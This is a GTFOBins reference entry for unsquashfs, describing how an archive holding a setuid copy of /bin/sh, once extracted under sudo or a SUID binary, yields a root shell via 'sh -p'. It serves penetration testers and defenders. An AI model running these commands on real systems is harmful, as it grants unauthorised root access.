<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/unsquashfs -->
---
comment: |-
  `unsquashfs` preserve the SUID bit when extracting the file system. For example, prepare an archive beforehand with the following commands as root:

  ```
  cp /bin/sh .
  chmod +s sh
  mksquashfs sh shell
  ```
functions:
  privilege-escalation:
  - code: |-
      unsquashfs shell
      ./squashfs-root/sh -p
    contexts:
      sudo:
      suid:
...
